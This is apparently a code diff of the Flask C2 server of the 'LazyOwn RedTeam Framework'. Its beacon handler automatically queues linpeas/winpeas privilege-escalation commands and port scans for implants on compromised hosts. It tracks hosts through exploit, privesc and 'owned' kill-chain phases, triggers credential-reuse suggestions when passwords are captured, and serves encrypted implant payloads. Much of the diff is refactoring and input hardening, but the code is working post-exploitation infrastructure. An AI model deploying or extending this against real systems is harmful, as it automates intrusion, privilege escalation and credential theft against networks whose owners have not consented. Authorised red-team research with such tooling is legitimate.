+                    return _has_user_pass or _has_ntlm or _has_hash or _is_multiline
+
+                _raw_ips = str(ips) if ips else ""
+                _primary_ip = _extract_first_ip(_raw_ips) or str(hostname)
+                from modules.conditional_hooks import get_hook_engine as _get_hooks
+
+                _hook_engine = _get_hooks()
+                _hook_engine.set_placeholders(
+                    {
+                        "rhost": str(getattr(config, "rhost", "")),
+                        "lhost": str(getattr(config, "lhost", "")),
+                        "domain": str(getattr(config, "domain", "")),
+                    }
+                )
+
+                def _normalise_platform(raw_platform: str) -> str:
+                    _r = raw_platform.lower()
+                    if "linux" in _r:
+                        return "linux"
+                    if "windows" in _r or "win" in _r:
+                        return "windows"
+                    return _r
+
+                if "run_command" not in _hook_engine._action_handlers:
+                    _allowed_dir = ALLOWED_DIRECTORY
+
+                    def _queue_beacon_cmd(action: dict, ctx: dict) -> bool | None:
+                        _cid = str(ctx.get("client_id", ""))
+                        _cmd = str(action.get("command", ""))
+                        if not _cid or not _cmd:
+                            return None
+                        _sanitized = "".join(c for c in _cid if c.isalnum() or c in "-_")
+                        _queue_path = os.path.join(_allowed_dir, f"cmd_{_sanitized}.json")
+                        try:
+                            _cmds: list = []
+                            if os.path.isfile(_queue_path):
+                                with open(_queue_path) as _qf:
+                                    _cmds = json.load(_qf)
+                            _cmds.append(_cmd)
+                            with open(_queue_path, "w") as _qf:
+                                json.dump(_cmds, _qf)
+                            logging.info("[hooks] Queued beacon cmd for %s: %s", _cid, _cmd[:80])
+                            return True
+                        except Exception as _exc:
+                            logging.warning("[hooks] Beacon queue failed: %s", _exc)
+                            return None
+
+                    _hook_engine.register_action_handler("run_command", _queue_beacon_cmd)
+                    _hook_engine.register_action_handler("run_scan_command", _queue_beacon_cmd)
+
+                _hctx = {
+                    "client_id": str(sanitized_client_id),
+                    "ip": _primary_ip,
+                    "hostname": str(hostname),
+                    "user": str(user),
+                    "platform": _normalise_platform(str(client)),
+                    "command": str(command),
+                    "output": str(output)[:500],
+                }
+
+                if _was_new:
+                    _hook_engine.fire("beacon_connected", _hctx)
+
+                try:
+                    from modules.world_model import HostState as _HS
+                    from modules.world_model import get_world_model as _get_wm
+
+                    _wm = _get_wm()
+                    _wm.advance_host(_primary_ip, _HS.EXPLOITED)
+                    _wm.add_note(_primary_ip, f"Foothold: {str(user)} via {str(client)}")
+                    logging.info("[world_model] Advanced %s to EXPLOITED (foothold)", _primary_ip)
+                    from modules.killchain import KillChain as _KC
+
+                    _KC.advance_phase("exploit", host=_primary_ip)
+                    logging.info("[killchain] Phase advanced to exploit via beacon %s", sanitized_client_id)
+                    if _was_new:
+                        _KC.advance_phase("privesc", host=_primary_ip)
+                        logging.info("[killchain] Phase advanced to privesc via beacon %s", sanitized_client_id)
+                except Exception as _wme:
+                    logging.debug("[world_model] advance failed: %s", _wme)
+
+                _hook_engine.fire("command_executed", _hctx)
+
+                # ── Queue linpeas/winpeas on first check-in only ─────────
+                if _was_new and bool(getattr(config, "auto_privesc_on_checkin", False)):
+                    try:
+                        _platform = _normalise_platform(str(client))
+                        _privesc_cmd = _build_privesc_command(_platform)
+                        _cmds = []
+                        _queue_path = _secure_command_queue_path(sanitized_client_id)
+                        if os.path.isfile(_queue_path):
+                            with open(_queue_path) as _qf:
+                                _cmds = json.load(_qf)
+                        if _privesc_cmd:
+                            _cmds.append(_privesc_cmd)
+                            logging.info(
+                                "[privesc] Queued %s for %s: %.100s",
+                                "linpeas" if _platform == "linux" else "winpeas",
+                                sanitized_client_id,
+                                _privesc_cmd,
+                            )
+                        _recon_state = _load_malleable_recon_state(sanitized_client_id)
+                        if not _recon_state.get("discover_queued") and bool(
+                            getattr(config, "auto_discover_on_checkin", False)
+                        ):
+                            _cmds.append("discover:")
+                            _recon_state["discover_queued"] = True
+                            logging.info(
+                                "[beacon_recon] Queued discover: for %s",
+                                sanitized_client_id,
+                            )
+                        _save_malleable_recon_state(sanitized_client_id, _recon_state)
+                        if _cmds:
+                            with open(_queue_path, "w") as _qf:
+                                json.dump(_cmds, _qf)
+                    except Exception as _qe:
+                        logging.debug("[privesc] Queue failed: %s", _qe)
+
+                try:
+                    _out_lower = str(output).lower()
+                    _owns = (
+                        str(user).lower() == "root"
+                        or "uid=0(root)" in _out_lower
+                        or ("uid=0(" in _out_lower and "root" in _out_lower)
+                        or "nt authority\\system" in _out_lower
+                        or str(user).lower() == "nt authority\\system"
+                    )
+                    if _owns:
+                        from modules.world_model import HostState as _HS2
+                        from modules.world_model import get_world_model as _get_wm2
+
+                        _wm2 = _get_wm2()
+                        _wm2.advance_host(_primary_ip, _HS2.OWNED)
+                        _wm2.add_note(_primary_ip, "Privilege escalation successful: root/System obtained")
+                        logging.info("[killchain] Beacon %s already root/System — host OWNED", sanitized_client_id)
+                        _hook_engine.fire("privilege_escalated", _hctx)
+                        _hook_engine.fire("host_owned", _hctx)
+                except Exception:
+                    pass
+
+                if result_pwd and _is_valid_credential(str(result_pwd)):
+                    _hook_engine.fire("credential_captured", _hctx)
+                    try:
+                        from modules.credential_reuse import get_credential_reuse_engine as _get_cre
+
+                        def _bg_cred_reuse(_ip=str(_primary_ip)):
+                            _cre = _get_cre()
+                            from modules.state_manager import StateManager as _SM
+
+                            _st = _SM()
+                            _candidates = _cre.suggest_from_state_manager(_st, limit=10)
+                            if _candidates:
+                                _summary = _cre.get_summary(_candidates)
+                                logging.info("[cred_reuse]\n%s", _summary)
+
+                        threading.Thread(target=_bg_cred_reuse, daemon=True).start()
+                    except Exception:
+                        pass
+
+                if result_portscan or discovered_ips:
+                    try:
+                        from modules.beacon_recon import ingest_beacon_recon as _ingest_recon
+
+                        _recon_stats = _ingest_recon(
+                            primary_ip=str(_primary_ip),
+                            discovered_ips=discovered_ips,
+                            portscan=result_portscan,
+                            hostname=str(hostname),
+                            user=str(user),
+                            client_id=str(sanitized_client_id),
+                        )
+                        logging.info(
+                            "[beacon_recon] %s: %s",
+                            sanitized_client_id,
+                            {key: _recon_stats.get(key) for key in ("hosts", "services")},
+                        )
+                        for _ps_host, _ps_ports in (_recon_stats.get("scanned") or {}).items():
+                            for _pp in _ps_ports:
+                                _hook_engine.fire(
+                                    "service_detected",
+                                    {"port": _pp, "host": _ps_host},
+                                )
+                        _recon_state = _load_malleable_recon_state(sanitized_client_id)
+                        if _recon_stats.get("discovered") and not _recon_state.get("portscan_queued"):
+                            _recon_state["portscan_queued"] = True
+                            _save_malleable_recon_state(sanitized_client_id, _recon_state)
+                            _enqueue_malleable_command(sanitized_client_id, "portscan:")
+                            logging.info(
+                                "[beacon_recon] Queued portscan: for %s (%d live host(s))",
+                                sanitized_client_id,
+                                len(_recon_stats.get("discovered") or []),
+                            )
+                    except Exception as _recon_exc:
+                        logging.debug("[beacon_recon] ingest failed: %s", _recon_exc)
+            except Exception as _hook_exc:
+                logging.debug("[hooks] fire failed: %s", _hook_exc)
+
             # ── C2 Bidirectionality: feed beacon output back into knowledge pipeline ──
             # This runs in a background thread so it never delays the beacon response.
             try:
-                import threading as _thr, sys as _sys
+                import sys as _sys
+                import threading as _thr
+
                 _skills = os.path.join(BASE_DIR, "skills")
-                _mods   = os.path.join(BASE_DIR, "modules")
+                _mods = os.path.join(BASE_DIR, "modules")
 
                 def _ingest_beacon(
-                    _ips=str(ips), _host=str(hostname), _cmd=str(command),
-                    _out=str(output), _user=str(user)
+                    _ips=str(ips), _host=str(hostname), _cmd=str(command), _out=str(output), _user=str(user)
                 ):
                     try:
                         if _skills not in _sys.path:
@@ -2607,24 +4031,25 @@ def receive_result(client_id):
                             _sys.path.insert(0, _mods)
 
                         # Determine primary IP
-                        primary_ip = _ips.split(",")[0].strip().strip("[]'\"")
+                        primary_ip = _extract_first_ip(_ips)
                         if not primary_ip:
                             primary_ip = _host
 
                         # Write output to sessions/<ip>/c2/<cmd_hash>/beacon.txt
                         import hashlib as _hl
+
                         cmd_slug = _hl.sha256(_cmd.encode()).hexdigest()[:8]
-                        out_dir = os.path.join(
-                            SESSIONS_DIR, primary_ip, "c2", cmd_slug
-                        )
+                        out_dir = os.path.join(SESSIONS_DIR, primary_ip, "c2", cmd_slug)
                         os.makedirs(out_dir, exist_ok=True)
                         beacon_file = os.path.join(out_dir, "beacon.txt")
                         with open(beacon_file, "a") as _bf:
                             _bf.write(f"# cmd: {_cmd}\n# user: {_user}\n{_out}\n")
 
                         # Ingest into FactStore
-                        from lazyown_facts import FactStore as _FS
                         from pathlib import Path as _P
+
+                        from lazyown_facts import FactStore as _FS
+
                         _fs = _FS()
                         n = _fs.ingest_text(_P(beacon_file), host_hint=primary_ip)
                         if n:
@@ -2639,25 +4064,26 @@ def receive_result(client_id):
                         # Re-read the actual client field from data dict
                         _raw_os = str(data.get("client", "")).lower()
                         if "windows" in _raw_os:
-                            _os_id, _os_name = "1", "Windows"
+                            _os_id, _os_name = "2", "Windows"
                         elif "linux" in _raw_os or "unix" in _raw_os:
-                            _os_id, _os_name = "2", "Linux"
+                            _os_id, _os_name = "1", "Linux"
                         else:
                             _os_id, _os_name = "4", "Unknown"
 
                         if _os_id != "4":
                             import json as _j
-                            _os_json_path = os.path.join(
-                                SESSIONS_DIR, "os.json"
-                            )
+
+                            _os_json_path = os.path.join(SESSIONS_DIR, "os.json")
                             try:
-                                _os_entry = [{
-                                    "id":    _os_id,
-                                    "os":    _os_name,
-                                    "ttl":   64 if _os_id == "2" else 128,
-                                    "state": "active",
-                                    "source": "beacon",
-                                }]
+                                _os_entry = [
+                                    {
+                                        "id": _os_id,
+                                        "os": _os_name,
+                                        "ttl": 64 if _os_id == "2" else 128,
+                                        "state": "active",
+                                        "source": "beacon",
+                                    }
+                                ]
                                 with open(_os_json_path, "w") as _ojf:
                                     _j.dump(_os_entry, _ojf, indent=4)
                                 logging.info(
@@ -2670,36 +4096,38 @@ def receive_result(client_id):
                             # Update world_model.json os_hint for this host.
                             _wm_path = os.path.join(SESSIONS_DIR, "world_model.json")
                             try:
-                                _wm = {}
-                                if os.path.isfile(_wm_path):
-                                    with open(_wm_path) as _wmf:
-                                        _wm = _j.load(_wmf)
+                                from modules.world_model import read_state_dict, write_state_dict
+
+                                _wm = read_state_dict(_wm_path)
                                 _hosts = _wm.setdefault("hosts", {})
                                 _h = _hosts.setdefault(primary_ip, {})
                                 if not _h.get("os_hint"):
                                     _h["os_hint"] = _os_name.lower()
-                                    with open(_wm_path, "w") as _wmf:
-                                        _j.dump(_wm, _wmf, indent=2)
+                                    write_state_dict(_wm_path, _wm)
                                     logging.info(
-                                        f"[c2-bidir] world_model.json os_hint={_os_name.lower()} "
-                                        f"host={primary_ip}"
+                                        f"[c2-bidir] world_model.json os_hint={_os_name.lower()} host={primary_ip}"
                                     )
                             except Exception as _wme:
                                 logging.debug(f"[c2-bidir] world_model update error: {_wme}")
 
                         # Emit event via event_engine
+                        import datetime as _dtt
+                        import uuid as _uu
+
                         from event_engine import _append_event as _ae
-                        import uuid as _uu, datetime as _dtt
-                        _ae({
-                            "id":        _uu.uuid4().hex[:8],
-                            "timestamp": _dtt.datetime.now(_dtt.timezone.utc).isoformat(),
-                            "type":      "BEACON_OUTPUT",
-                            "severity":  "info",
-                            "rule_id":   "c2_beacon",
-                            "source":    {"ip": primary_ip, "cmd": _cmd[:80], "user": _user},
-                            "suggest":   f"New beacon output from {primary_ip}. Run facts_show(refresh=True).",
-                            "status":    "pending",
-                        })
+
+                        _ae(
+                            {
+                                "id": _uu.uuid4().hex[:8],
+                                "timestamp": _dtt.datetime.now(_dtt.timezone.utc).isoformat(),
+                                "type": "BEACON_OUTPUT",
+                                "severity": "info",
+                                "rule_id": "c2_beacon",
+                                "source": {"ip": primary_ip, "cmd": _cmd[:80], "user": _user},
+                                "suggest": f"New beacon output from {primary_ip}. Run facts_show(refresh=True).",
+                                "status": "pending",
+                            }
+                        )
                     except Exception as _exc:
                         logging.debug(f"[c2-bidir] ingest failed: {_exc}")
 
@@ -2709,69 +4137,63 @@ def receive_result(client_id):
 
             return jsonify({"status": "success", "Platform": client}), 200
 
-        except IOError as e:
-            if config.enable_c2_debug == True:
-                logger.info(f"[ERROR] File operation error")
+        except IOError:
+            if config.enable_c2_debug:
+                logger.info("[ERROR] File operation error")
             return jsonify({"status": "error", "message": "File operation error"}), 500
 
     except json.JSONDecodeError:
-        if config.enable_c2_debug == True:
-            logger.info(f"[ERROR] Invalid JSON received")
+        if config.enable_c2_debug:
+            logger.info("[ERROR] Invalid JSON received")
         return jsonify({"status": "error", "message": "Invalid JSON"}), 400
-    except Exception as e:
+    except Exception:
         logger.exception("Unexpected error in handler")
         return jsonify({"status": "error", "message": "Internal server error"}), 500
 
 
-@app.route('/issue_command', methods=['POST'])
-@requires_auth
+@app.route("/issue_command", methods=["POST"])
+@requires_auth_or_session
+@csrf_protect
 @limiter.limit("20 per minute")
 def issue_command():
-    client_id = request.form['client_id']
-    command = request.form['command']
+    client_id = request.form["client_id"]
+    command = request.form["command"]
 
     commands[client_id] = command
     if client_id not in commands_history:
         commands_history[client_id] = []
     commands_history[client_id].append(command)
 
-    return redirect(url_for('index'))
+    return redirect(url_for("index"))
 
-@app.route('/upload', methods=['GET', 'POST'])
-@app.route(f'{route_maleable}/upload', methods=['GET', 'POST'])
+
+@app.route("/upload", methods=["GET", "POST"])
+@app.route(f"{route_malleable}/upload", methods=["GET", "POST"])
 def upload():
-    if request.method == 'POST':
-
-        if 'file' in request.files:
-            file = request.files['file']
-            if file.filename == '':
+    if request.method == "POST":
+        if "file" in request.files:
+            file = request.files["file"]
+            if file.filename == "":
                 return jsonify({"status": "error", "message": "Empty filename"}), 400
             filename = secure_filename(file.filename)
             file.save(os.path.join(UPLOAD_FOLDER, filename))
             return jsonify({"status": "success", "message": f"File {filename} uploaded"}), 200
-
 
         else:
             encrypted_data = request.get_data()
             if not encrypted_data:
                 return jsonify({"status": "error", "message": "No data received"}), 400
 
-
             filename = secure_filename("archivo_recibido.bin")
 
             decrypted_data = decrypt_data(encrypted_data, True)
 
-            with open(os.path.join(UPLOAD_FOLDER, filename), 'wb') as f:
+            with open(os.path.join(UPLOAD_FOLDER, filename), "wb") as f:
                 f.write(decrypted_data)
 
-            return jsonify({
-                "status": "success",
-                "message": "File uploaded without header",
-                "filename": filename
-            }), 200
+            return jsonify({"status": "success", "message": "File uploaded without header", "filename": filename}), 200
 
-
-    return '''
+    return """
     <!doctype html>
     <title>Upload File</title>
     <h1>Upload a File</h1>
@@ -2779,61 +4201,68 @@ def upload():
       <input type="file" name="file">
       <input type="submit" value="Upload">
     </form>
-    '''
+    """
 
-@app.route('/download_file', methods=['POST'])
-@app.route(f'{route_maleable}download_file', methods=['POST'])
+
+@app.route("/download_file", methods=["POST"])
+@app.route(f"{route_malleable}download_file", methods=["POST"])
 def download_file():
-    client_id = request.form['client_id']
-    file = request.files['file']
+    client_id = request.form["client_id"]
+    file = request.files["file"]
     if file:
-        temp_dir = os.path.join(os.getcwd(), 'sessions/temp_uploads')
+        temp_dir = os.path.join(os.getcwd(), "sessions/temp_uploads")
         os.makedirs(temp_dir, exist_ok=True)
-        safe_fname = secure_filename(file.filename) if file.filename else ''
+        safe_fname = secure_filename(file.filename) if file.filename else ""
         if not safe_fname:
             return jsonify({"status": "error", "message": "Invalid filename"}), 400
         file_path = os.path.join(temp_dir, safe_fname)
         file.save(file_path)
         commands[client_id] = f"download:{safe_fname}"
 
-        return redirect(url_for('index'))
+        return redirect(url_for("index"))
     else:
         return jsonify({"status": "error", "message": "No file selected"}), 400
 
-import os
-from flask import Flask, Response, jsonify
 
-@app.route('/download/<path:file_path>', methods=['GET'])
-@app.route(f'{route_maleable}download/<path:file_path>', methods=['GET'])
+import os  # noqa: E402
+
+from flask import Flask  # noqa: E402
+
+_DOWNLOAD_SAFE_SERVICE = _SafeFileService(Path(os.path.join(os.getcwd(), "sessions", "temp_uploads")))
+
+
+@app.route("/download/<path:file_path>", methods=["GET"])
+@app.route(f"{route_malleable}download/<path:file_path>", methods=["GET"])
 def serve_file(file_path):
-    temp_dir = os.path.join(os.getcwd(), 'sessions/temp_uploads')
-   ## file_path = secure_filename(file_path) this broken the implant downloads #TODO see what happends
+    """Serve a file from ``sessions/temp_uploads`` through :class:`SafeFileService`.
 
-    requested_path = os.path.join(temp_dir, file_path)
+    Args:
+        file_path: Operator-supplied path component. The :class:`SafeFileService`
+            is responsible for resolving it canonically and rejecting any
+            attempt to escape the base directory (including Windows-style
+            ``..\\`` traversal and null-byte injection).
 
-
-    normalized_temp_dir = os.path.normpath(temp_dir)
-    normalized_requested_path = os.path.normpath(requested_path)
-
-
-    if not normalized_requested_path.startswith(normalized_temp_dir + os.sep):
+    Returns:
+        A Flask response with the AES-encrypted payload, or a 403/404
+        error JSON when the path is unsafe or missing.
+    """
+    try:
+        file_data = _DOWNLOAD_SAFE_SERVICE.read_bytes(file_path)
+    except PermissionError:
         return jsonify({"status": "error", "message": "Access denied"}), 403
-
-    if os.path.exists(normalized_requested_path):
-        try:
-            with open(normalized_requested_path, 'rb') as f:
-                file_data = f.read()
-            encrypted_data = encrypt_data(file_data)
-            safe_dl_name = os.path.basename(file_path).replace('"', '').replace('\n', '').replace('\r', '')
-            return Response(
-                encrypted_data,
-                mimetype='application/octet-stream',
-                headers={'Content-Disposition': f'attachment; filename="{safe_dl_name}"'}
-            )
-        except Exception as e:
-            return str("audio"), 500
-    else:
+    except FileNotFoundError:
         return jsonify({"status": "error", "message": "File not found"}), 404
+    try:
+        encrypted_data = encrypt_data(file_data)
+        safe_dl_name = os.path.basename(file_path).replace('"', "").replace("\n", "").replace("\r", "")
+        return Response(
+            encrypted_data,
+            mimetype="application/octet-stream",
+            headers={"Content-Disposition": f'attachment; filename="{safe_dl_name}"'},
+        )
+    except Exception:
+        return jsonify({"status": "error", "message": "Encryption failure"}), 500
+
 
 _TEMPLATE_NAME_STRICT_PATTERN = re.compile(r"^([a-zA-Z0-9_.-]+)\.html$")
 _TEMPLATE_NAME_MAX_LENGTH = 128
@@ -2904,7 +4333,7 @@ def _resolve_secure_template_path(template_name):
     return str(candidate)
 
 
-@app.route('/mkendpoint', methods=['GET', 'POST'])
+@app.route("/mkendpoint", methods=["GET", "POST"])
 @login_required
 def create_route():
     """Register a new operator-supplied dynamic route bound to a template.
@@ -2918,11 +4347,11 @@ def create_route():
         POST the new route is persisted and the operator is redirected
         back to the form with a success or error message.
     """
-    if request.method != 'POST':
-        return render_template('create_route.html')
+    if request.method != "POST":
+        return render_template("create_route.html")
 
-    route_path = request.form.get('route_path', '').strip('/')
-    template_name = request.form.get('template_name', '')
+    route_path = request.form.get("route_path", "").strip("/")
+    template_name = request.form.get("template_name", "")
 
     logger.debug(f"Creating route: {route_path} with template: {template_name}")
 
@@ -2930,7 +4359,7 @@ def create_route():
     if not route_valid:
         logger.warning(f"Invalid route path '{route_path}': {route_error}")
         return render_template(
-            'create_route.html',
+            "create_route.html",
             error=f"Invalid route path: {route_error}",
         )
 
@@ -2938,14 +4367,14 @@ def create_route():
     if not template_valid:
         logger.warning(f"Invalid template name '{template_name}': {template_error}")
         return render_template(
-            'create_route.html',
+            "create_route.html",
             error=f"Invalid template name: {template_error}",
         )
 
     secure_template_path = _resolve_secure_template_path(template_name)
     if not secure_template_path:
         return render_template(
-            'create_route.html',
+            "create_route.html",
             error=f"Template {template_name} is invalid, does not exist, or is outside the templates folder.",
         )
 
@@ -2954,7 +4383,7 @@ def create_route():
         if route_path in dynamic_routes:
             logger.warning(f"Route /{route_path} already exists")
             return render_template(
-                'create_route.html',
+                "create_route.html",
                 error=f"Route /{route_path} already exists.",
             )
         dynamic_routes[route_path] = template_name
@@ -2962,24 +4391,25 @@ def create_route():
         logger.info(f"Route /{route_path}/log/<data> created with template {template_name}")
         return redirect(
             url_for(
-                'create_route',
+                "create_route",
                 success=f"Route /{route_path}/log/<data> created with template {template_name}.",
             )
         )
     except Exception as exc:
         logger.error(f"Error saving routes: {exc}")
         return render_template(
-            'create_route.html',
-            error='Error saving route configuration.',
+            "create_route.html",
+            error="Error saving route configuration.",
         )
 
-@app.route('/<path:route_path>/log/<path:data>', methods=['GET', 'POST'])
+
+@app.route("/<path:route_path>/log/<path:data>", methods=["GET", "POST"])
 def dynamic_route(route_path, data):
     """Handle dynamic routes based on stored route-to-template mappings."""
-    import html
-    import re
-    from flask import request, render_template, jsonify
     import logging as logger
+    import re
+
+    from flask import jsonify, render_template
 
     def sanitize_input(input_str):
         """Sanitize input to prevent XSS attacks."""
@@ -2996,7 +4426,7 @@ def dynamic_route(route_path, data):
         if not route_path or not isinstance(route_path, str):
             return False
         # Solo caracteres seguros
-        return re.match(r'^[a-zA-Z0-9/_\-]+$', route_path) is not None
+        return re.match(r"^[a-zA-Z0-9/_\-]+$", route_path) is not None
 
     def is_valid_data(data):
         """Validate data parameter."""
@@ -3006,14 +4436,14 @@ def dynamic_route(route_path, data):
         if len(data) > 2000:  # Ajusta según necesidades
             return False
         # Solo caracteres seguros
-        return re.match(r'^[a-zA-Z0-9/_\-\.@%=+\[\]{}:;, ]*$', data) is not None
+        return re.match(r"^[a-zA-Z0-9/_\-\.@%=+\[\]{}:;, ]*$", data) is not None
 
     def is_valid_template_name(template_name):
         """Validate template name."""
         if not template_name or not isinstance(template_name, str):
             return False
         # Solo nombres de template seguros
-        return re.match(r'^[a-zA-Z0-9_.\-]+\.html$', template_name) is not None
+        return re.match(r"^[a-zA-Z0-9_.\-]+\.html$", template_name) is not None
 
     # Sanitizar entradas
     sanitized_route_path = sanitize_input(route_path)
@@ -3022,11 +4452,11 @@ def dynamic_route(route_path, data):
     # Validar formatos
     if not is_valid_route_path(route_path):
         logger.warning(f"Invalid route path format: {route_path}")
-        return jsonify({'error': 'Invalid route path format'}), 400
+        return jsonify({"error": "Invalid route path format"}), 400
 
     if not is_valid_data(data):
         logger.warning(f"Invalid data format: {data}")
-        return jsonify({'error': 'Invalid data format'}), 400
+        return jsonify({"error": "Invalid data format"}), 400
 
     DYNAMIC_ROUTES = load_routes()
     logger.debug(f"Handling dynamic route: {sanitized_route_path}/log/{sanitized_data}")
@@ -3034,69 +4464,72 @@ def dynamic_route(route_path, data):
     if route_path not in DYNAMIC_ROUTES:
         logger.warning(f"Short URL not found or inactive: {sanitized_route_path}")
         # No reflejar la entrada del usuario en el error
-        return jsonify({'error': 'Short URL not found or inactive'}), 404
+        return jsonify({"error": "Short URL not found or inactive"}), 404
 
     try:
         request_details = get_request_details()
-        request_details['data'] = sanitized_data  # Usar versión sanitizada
+        request_details["data"] = sanitized_data  # Usar versión sanitizada
 
         response = save_to_log(request_details)
 
         if response is None:
             logger.error("save_to_log returned None")
-            return jsonify({'error': 'Internal server error: Log save failed'}), 500
+            return jsonify({"error": "Internal server error: Log save failed"}), 500
 
         if isinstance(response, tuple):
             logger.error("Log save failed for dynamic route")
-            return jsonify({'error': 'Internal server error: Log save failed'}), 500
+            return jsonify({"error": "Internal server error: Log save failed"}), 500
 
         template_name = DYNAMIC_ROUTES[route_path]
 
         # Validar nombre del template
         if not is_valid_template_name(template_name):
             logger.error(f"Invalid template name: {template_name}")
-            return jsonify({'error': 'Invalid template configuration'}), 500
+            return jsonify({"error": "Invalid template configuration"}), 500
 
         logger.debug(f"Rendering template: {template_name}")
 
         safe_session_id = uuid.uuid4().hex
         # Pasar datos sanitizados al template
-        return render_template(template_name,
-                             data=sanitized_data,
-                             session_id=safe_session_id)
+        return render_template(template_name, data=sanitized_data, session_id=safe_session_id)
 
     except Exception:
         logger.exception("Error in dynamic_route")
         # No exponer detalles del error al usuario
-        return jsonify({'error': 'Internal server error'}), 500
+        return jsonify({"error": "Internal server error"}), 500
 
-@app.route('/log/<path:data>', methods=['GET', 'POST'])
+
+@app.route("/log/<path:data>", methods=["GET", "POST"])
 def log(data):
     """Log request details to JSON file."""
     try:
         request_details = get_request_details()
-        request_details['data'] = data
+        request_details["data"] = data
         response = save_to_log(request_details)
         if isinstance(response, tuple):
             logger.error("Log save failed in /log handler")
-            return jsonify({'error': 'Internal server error: Log save failed'}), 500
+            return jsonify({"error": "Internal server error: Log save failed"}), 500
         safe_id = uuid.uuid4().hex
         logger.debug("Logged request successfully")
-        return jsonify({'status': 'logged', 'id': safe_id}), 200
+        return jsonify({"status": "logged", "id": safe_id}), 200
     except Exception:
         logger.exception("Error in log handler")
-        return jsonify({'error': 'Internal server error'}), 500
+        return jsonify({"error": "Internal server error"}), 500
 
-@app.route('/favicon.ico')
+
+@app.route("/favicon.ico")
 def favicon():
     """Serve the favicon.ico file."""
     try:
-        return send_from_directory(os.path.join(app.root_path, 'static'), 'favicon.ico', mimetype='image/vnd.microsoft.icon')
+        return send_from_directory(
+            os.path.join(app.root_path, "static"), "favicon.ico", mimetype="image/vnd.microsoft.icon"
+        )
     except FileNotFoundError:
         logger.warning("Favicon not found")
-        return jsonify({'error': 'Favicon not found'}), 404
+        return jsonify({"error": "Favicon not found"}), 404
 
-@app.route('/palette', methods=['GET'])
+
+@app.route("/palette", methods=["GET"])
 @requires_auth
 def palette_view():
     """Render the operator command palette browser.
@@ -3109,20 +4542,21 @@ def palette_view():
     try:
         palette_index = _palette_load_index()
     except _PaletteIndexError as exc:
-        return render_template('palette.html', error=str(exc), context=None), 503
+        logger.error("palette index load failed: %s", type(exc).__name__)
+        return render_template("palette.html", error="Command index unavailable", context=None), 503
     context = _palette_build_view(palette_index)
     return render_template(
-        'palette.html',
+        "palette.html",
         error=None,
         context=context,
         context_json=json.dumps(context, ensure_ascii=False),
     )
 
 
-_PALETTE_API_RATE_LIMIT = getattr(config, 'c2_palette_limit', '60 per minute')
+_PALETTE_API_RATE_LIMIT = getattr(config, "c2_palette_limit", "60 per minute")
 
 
-@app.route('/api/palette', methods=['GET'])
+@app.route("/api/palette", methods=["GET"])
 @requires_auth
 @limiter.limit(_PALETTE_API_RATE_LIMIT)
 def palette_api():
@@ -3140,19 +4574,42 @@ def palette_api():
         palette_index = _palette_load_index()
     except _PaletteIndexError as exc:
         logger.error(f"palette_api: command index unavailable: {exc}")
-        return jsonify({'error': 'Command index unavailable'}), 503
+        return jsonify({"error": "Command index unavailable"}), 503
     return jsonify(_palette_build_view(palette_index))
 
 
-@app.route('/api/data')
+@app.route("/api/data")
 @requires_auth
 def api_data():
+    try:
+        return _api_data_inner()
+    except Exception as exc:
+        logging.error("api_data crashed: %s", exc, exc_info=True)
+        return jsonify(
+            {
+                "error": "Internal server error",
+                "connected_clients": list(connected_clients),
+                "commands_history": {},
+                "os_data": {},
+                "hostname": {},
+                "ips": {},
+                "user": {},
+                "pid": {},
+                "discovered_ips": {},
+                "result_portscan": {},
+                "result_pwd": {},
+                "results": {},
+            }
+        ), 200
+
+
+def _api_data_inner():
     path = os.getcwd()
     prompt = getprompt()
     short_urls = load_short_urls()
-    prompt = prompt.replace('\n','<br>')
-    sessions_dir = f'{path}/sessions'
-    json_files = [f for f in os.listdir(sessions_dir) if f.endswith('.json')]
+    prompt = prompt.replace("\n", "<br>")
+    sessions_dir = f"{path}/sessions"
+    json_files = [f for f in os.listdir(sessions_dir) if f.endswith(".json")]
     implants_check()
     if not json_files:
         return jsonify({"error": "No JSON files found in the sessions directory."}), 404
@@ -3161,16 +4618,18 @@ def api_data():
     latest_json_file = max(json_files, key=lambda x: os.path.getctime(os.path.join(sessions_dir, x)))
     json_path = os.path.join(sessions_dir, latest_json_file)
 
-    with open(json_path, 'r') as f:
+    with open(json_path, "r") as f:
         session_data = json.load(f)
 
     if isinstance(session_data, list):
         session_data = session_data[0] if session_data else {}
 
-    session_data['params'] = make_serializable(session_data.get('params', {}))
-    session_data['params']['api_key'] = 'Hidden conntent'
+    session_data["params"] = make_serializable(session_data.get("params", {}))
+    session_data["params"]["api_key"] = "Hidden conntent"
     connected_clients_list = list(connected_clients)
-    directories = [d for d in os.listdir(atomic_framework_path) if os.path.isdir(os.path.join(atomic_framework_path, d))]
+    directories = [
+        d for d in os.listdir(atomic_framework_path) if os.path.isdir(os.path.join(atomic_framework_path, d))
+    ]
 
     commands_history = {}
     os_data = {}
@@ -3185,185 +4644,213 @@ def api_data():
         csv_file = f"sessions/{client_id}.log"
         try:
             if os.path.isfile(csv_file):
-                with open(csv_file, 'r') as f:
+                with open(csv_file, "r") as f:
                     reader = csv.DictReader(f)
                     rows = list(reader)
                     if rows:
                         commands_history[client_id] = [rows[-1]]
-                        os_data[client_id] = rows[-1]['os']
-                        pid[client_id] = rows[-1]['pid']
-                        hostname[client_id] = rows[-1]['hostname']
-                        ips[client_id] = rows[-1]['ips']
-                        user[client_id] = rows[-1]['user']
-                        discovered_ips[client_id] = rows[-1]['discovered_ips']
-                        result_portscan[client_id] = rows[-1]['result_portscan']
-                        result_pwd[client_id] = rows[-1]['result_pwd']
-        except Exception as e:
-            if config.enable_c2_debug == True:
+                        os_data[client_id] = rows[-1]["os"]
+                        pid[client_id] = rows[-1]["pid"]
+                        hostname[client_id] = rows[-1]["hostname"]
+                        ips[client_id] = rows[-1]["ips"]
+                        user[client_id] = rows[-1]["user"]
+                        discovered_ips[client_id] = rows[-1]["discovered_ips"]
+                        result_portscan[client_id] = rows[-1]["result_portscan"]
+                        result_pwd[client_id] = rows[-1]["result_pwd"]
+        except Exception:
+            if config.enable_c2_debug:
                 logger.info("[Error] implant logs corrupted.")
 
     event_config = load_event_config()
     response_bot = "<p><h3>LazyOwn RedTeam Framework</h3> The <b>First GPL Ai Powered C&C</b> of the <b>World</b></p>"
     tools = []
     for filename in os.listdir(TOOLS_DIR):
-        if filename.endswith('.tool'):
+        if filename.endswith(".tool"):
             tool_path = os.path.join(TOOLS_DIR, filename)
-            with open(tool_path, 'r') as file:
+            with open(tool_path, "r") as file:
                 tool_data = json.load(file)
-                tool_data['filename'] = filename
+                tool_data["filename"] = filename
